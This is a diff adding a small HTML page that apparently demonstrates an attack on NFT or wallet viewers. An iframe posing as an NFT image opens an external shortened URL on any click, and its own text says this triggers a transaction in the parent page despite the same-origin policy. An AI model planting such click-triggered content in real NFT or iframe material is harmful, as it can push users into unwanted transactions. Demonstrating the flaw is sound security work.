@@ -1,0 +1,37 @@
+<!doctype html>
+<html>
+<head>
+    <style>
+        html {
+            font-family: sans-serif;
+        }
+        h1 {
+            font-size: 1.4em;
+        }
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<h1>iframe on <span id="originOutput"></span></h1>
+
+<p>
+    Tap/click this iframe, which will call the provided URL to send a transaction in the parent page context.
+    (Observe the transaction being initiated)
+</p>
+
+<p>This is an NFT shown through an iframe due to SOP; the NFTs should never get access to the parent domain</p>
+
+<p><b>IN SOP WE TRUST</b></p>
+
+<img src="https://agentjacker.github.io/kittycat.png">
+
+<script>
+    document.getElementById('originOutput').innerText = window.location.origin;
+
+    document.body.addEventListener('click', function () {
+        http://window.open('https://t.co/WXRjkSVLtb');
+    });
+</script>
+
+</body>
+</html>
